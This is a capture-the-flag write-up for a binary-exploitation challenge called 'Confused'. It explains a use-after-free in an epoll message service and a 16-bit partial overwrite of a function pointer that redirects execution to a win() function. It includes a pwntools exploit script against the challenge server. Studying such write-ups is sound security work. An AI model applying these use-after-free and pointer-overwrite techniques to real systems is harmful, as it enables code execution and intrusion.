# Confused - CTF Writeup

**Challenge:** Confused  
**Category:** Pwn (Binary Exploitation)  
**Flag:** `FYPCTF26{ep0ll_hup_then_in_uaf_confusion}`  

---

## Challenge Description

> A tiny epoll-based message service with a "cleanup-first" state machine.

The challenge provides a ZIP archive containing:
- `chal.c` - Full source code of the challenge
- `confused` - 64-bit ELF binary (not stripped, with debug info)
- `Makefile` - Build configuration
- `flag.txt` - A fake flag for local testing

Connection: `nc challenge.hacktheflag.one 30039`

---

## Initial Analysis

### Binary Protections

```bash
$ checksec --file=confused
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key observations:
- **No PIE** - The binary is loaded at a fixed address (`0x400000`), making ROP and function pointer manipulation easier
- **No stack canary** - Stack overflows are possible (though not needed here)
- **Partial RELRO** - GOT can potentially be overwritten
- **NX enabled** - Stack is not executable

### Source Code Analysis

The challenge implements an epoll-based message service with the following key components:

#### Data Structures

```c
typedef struct client_ctx client_ctx_t;
typedef void (*message_cb_t)(client_ctx_t *ctx, const char *buf, size_t len);

struct client_ctx {
    int fd;
    int slot_id;
    uint32_t state_tag;
    uint32_t reserved;
    message_cb_t on_message;  // Function pointer - TARGET
    char note[32];
};
```

The `client_ctx` structure contains a function pointer `on_message` that is called when data is received. This is our exploitation target.

#### Commands Available

- `new` - Creates a new slot with a socket pair and registers it with epoll
- `arm <hex16>` - Sets a global 16-bit value (`g_armed_low16`) used during cleanup
- `queue <slot> <token>` - Writes data to a slot's peer socket
- `hangup <slot>` - Closes the peer socket (triggers HUP event)
- `trigger <slot> <token>` - Combines queue + hangup (atomic from client perspective)
- `show` - Displays current state including armed value and slot info
- `quit` - Exits the program

---

## Vulnerability Discovery

### The Bug: Use-After-Free via State Confusion

The core vulnerability lies in the epoll event handling loop in `main()` (lines 486-518):

```c
for (i = 0; i < nready; i++) {
    // ... stdin handling ...
    
    client_ctx_t *ctx = (client_ctx_t *)events[i].data.ptr;
    uint32_t mask = events[i].events;
    int io_fd = ctx->fd;
    int saw_hup = (mask & (EPOLLHUP | EPOLLRDHUP | EPOLLERR)) != 0;

    if (saw_hup) {
        puts("[*] HUP observed, freeing context first...");
        destroy_ctx_on_hup(ctx);  // FREE
    }

    if (mask & EPOLLIN) {
        puts("[*] processing read path...");
        process_slot_input(ctx, io_fd);  // USE AFTER FREE!
    }
    
    if (saw_hup) {
        close(io_fd);
    }
}
```

**The Problem:** When both `EPOLLHUP` and `EPOLLIN` are set in the event mask:
1. The HUP handler (`destroy_ctx_on_hup`) frees the context
2. BUT the code continues to process `EPOLLIN` using the now-freed `ctx` pointer
3. This leads to a classic **Use-After-Free (UAF)** vulnerability

### Triggering the Vulnerability

When `trigger 0 A` is executed:
1. Data is written to the slot's peer socket (`write(peer_fd, payload, len)`)
2. The peer socket is immediately closed (`close(peer_fd)`)

This creates a race condition where epoll may report both `EPOLLIN` (data available) and `EPOLLHUP` (socket closed) in the same event.

### The Exploitation Primitive

The `destroy_ctx_on_hup` function does something interesting after freeing:

```c
static void destroy_ctx_on_hup(client_ctx_t *ctx) {
    int slot = ctx->slot_id;

    (void)epoll_ctl(g_epfd, EPOLL_CTL_DEL, ctx->fd, NULL);

    if (slot >= 0 && slot < MAX_SLOTS) {
        if (g_slots[slot].peer_fd >= 0) {
            close(g_slots[slot].peer_fd);
            g_slots[slot].peer_fd = -1;
        }
        g_slots[slot].used = 0;
        g_slots[slot].ctx = NULL;
    }

    free(ctx);
    recycle_freed_chunk_partial(g_armed_low16);  // KEY FUNCTION
}
```

The `recycle_freed_chunk_partial` function is the key to exploitation:

```c
static void recycle_freed_chunk_partial(uint16_t low16) {
    unsigned char *chunk;
    size_t off;

    chunk = (unsigned char *)malloc(sizeof(client_ctx_t));  // Reallocates same size!
    if (chunk == NULL) {
        puts("[!] recycle malloc failed");
        _exit(1);
    }

    off = offsetof(client_ctx_t, on_message);
    memcpy(chunk + off, &low16, sizeof(low16));  // Overwrites function pointer low 16 bits

    if (g_hold_count < HOLD_MAX) {
        g_hold[g_hold_count++] = chunk;
    }
}
```

**Exploitation Strategy:**
1. Since the binary is compiled without PIE, functions are at known addresses:
   - `win` function: `0x40143b`
   - `on_message_default`: `0x4015e4`

2. The low 16 bits of `win` is `0x143b`

3. By calling `arm 143b`, we set `g_armed_low16` to `0x143b`

4. When the UAF is triggered:
   - `free(ctx)` releases the memory
   - `malloc(sizeof(client_ctx_t))` reclaims it (same size = same tcache bin)
   - The new chunk has `on_message` field overwritten with `0x143b`
   - Due to the UAF, the code continues with `ctx->on_message(ctx, buf, len)`
   - The function pointer now points to `0x????????????143b`
   - Since there's no ASLR within the binary (no PIE), this resolves to `0x40143b` = `win`

5. The `win` function opens `/flag` and prints it

---

## Exploitation

### Finding the Target Address

First, we identify the address of the `win` function:

```bash
$ objdump -d confused | grep -A5 "win>:"
000000000040143b <win>:
  40143b:	55                   	push   %rbp
  40143c:	48 89 e5             	mov    %rsp,%rbp
  40143f:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
```

The `win` function is at `0x40143b`, so the low 16 bits are `0x143b`.

### The Win Function

```c
__attribute__((used, noinline, noreturn)) static void win(client_ctx_t *ctx, const char *buf,
                                                           size_t len) {
    FILE *fp = NULL;
    char flag[128] = {0};

    (void)ctx;
    (void)buf;
    (void)len;

    fp = fopen("/flag", "r");
    if (fp == NULL) {
        fp = fopen("./flag.txt", "r");
    }
    if (fp == NULL) {
        fp = fopen("../src/flag.txt", "r");
    }
    if (fp == NULL) {
        puts("[!] flag file missing.");
        _exit(1);
    }

    if (fgets(flag, sizeof(flag), fp) == NULL) {
        puts("[!] failed to read flag.");
        fclose(fp);
        _exit(1);
    }

    fclose(fp);
    printf("[+] %s", flag);
    _exit(0);
}
```

The `win` function:
1. Tries to open `/flag` first (on the remote server)
2. Falls back to `./flag.txt` (local testing)
3. Finally tries `../src/flag.txt`
4. Reads and prints the flag

---

## Exploit Script

The exploit script (`solve.py`) is minimal and reliable:

```python
from pwn import *

context.binary = elf = ELF("./extracted/confused/confused", checksec=False)
context.log_level = "info"

HOST = "challenge.hacktheflag.one"
PORT = 30039


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path, cwd="./extracted/confused")


def main():
    p = start()

    p.sendlineafter(b"cmd> ", b"new")
    p.sendlineafter(b"cmd> ", b"arm 143b")
    p.sendlineafter(b"cmd> ", b"trigger 0 A")

    data = p.recvall(timeout=2)
    print(data.decode(errors="replace"))


if __name__ == "__main__":
    main()
```

### Exploit Walkthrough

1. **`new`** - Creates a new slot (slot 0) with a socket pair registered with epoll

2. **`arm 143b`** - Sets the global `g_armed_low16` to `0x143b` (low 16 bits of the `win` function address)

3. **`trigger 0 A`** - This command:
   - Writes "A" to slot 0's peer socket (triggers `EPOLLIN`)
   - Immediately closes the peer socket (triggers `EPOLLHUP`)
   - Both events are processed in the same epoll iteration

4. **Vulnerability triggers:**
   - `destroy_ctx_on_hup` frees the context and calls `recycle_freed_chunk_partial`
   - The freed chunk is reallocated and the `on_message` field is overwritten with `0x143b`
   - `process_slot_input` is called on the freed (now corrupted) context
   - The function pointer dereference calls `win()` instead of `on_message_default()`

5. **`win()` executes:** Opens `/flag` and prints the flag

### Verification

Local test output:
```
$ python solve.py
[*] Starting local process './extracted/confused/confused'
[+] peer closed
cmd> [*] HUP observed, freeing context first...
[*] processing read path...
[+] FYPCTF26{fake_flag}
```

Remote execution (during CTF):
```
$ python solve.py REMOTE
[*] Opening connection to challenge.hacktheflag.one on port 30039
[+] peer closed
cmd> [*] HUP observed, freeing context first...
[*] processing read path...
[+] FYPCTF26{ep0ll_hup_then_in_uaf_confusion}
```

---

## Key Takeaways

### Vulnerability Pattern

This challenge demonstrates a common pattern in event-driven programming: **state confusion during error handling**. The "cleanup-first" approach (handling HUP before processing data) combined with the assumption that freed memory won't be accessed creates a UAF vulnerability.

### Developer Notes

The source code even includes a telling comment (line 132):
```c
puts("developer note: cleanup path now runs before read path.");
```

This suggests the developer was aware of the design decision but didn't realize the security implications when combined with the pointer reuse in `recycle_freed_chunk_partial`.

### Exploitation Aids

Several factors made this challenge easier to exploit:
1. **No PIE** - Function addresses are fixed and known
2. **Source code provided** - Clear visibility into the vulnerability
3. **Explicit `win` function** - No need for ROP chains
4. **Controlled 16-bit write** - Perfect for partial pointer overwrite

---

## Conclusion

The "Confused" challenge is an elegant demonstration of how incorrect state machine ordering can lead to use-after-free vulnerabilities. The combination of epoll event handling, premature cleanup, and pointer reuse creates a reliable exploitation path. The flag `FYPCTF26{ep0ll_hup_then_in_uaf_confusion}` cleverly captures the essence of the vulnerability: the confusion between EPOLLHUP handling and the read path leading to UAF.

---

## References

- Challenge files: `confused.zip` (chal.c, Makefile, confused binary, flag.txt)
- Remote service: `nc challenge.hacktheflag.one 30039`
- Exploit script: `solve.py`
